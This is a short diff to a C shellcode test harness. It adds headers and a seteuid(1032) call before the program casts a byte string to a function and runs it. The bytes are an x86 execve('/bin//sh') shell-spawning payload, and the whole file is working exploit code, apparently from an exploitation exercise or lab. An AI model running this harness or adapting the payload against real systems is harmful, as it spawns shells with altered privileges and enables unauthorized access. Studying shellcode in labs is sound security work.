@@ -1,3 +1,5 @@
+#include <sys/types.h>
+#include <unistd.h>
 #include <stdio.h>
 #include <string.h>
 
@@ -5,6 +7,9 @@ char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\
 
 int main(void) {
   fprintf(stdout, "Length: %d\n",strlen(shellcode));
+
+  seteuid(1032);
+
   (*(void(*)()) shellcode)();
 
   return 0;
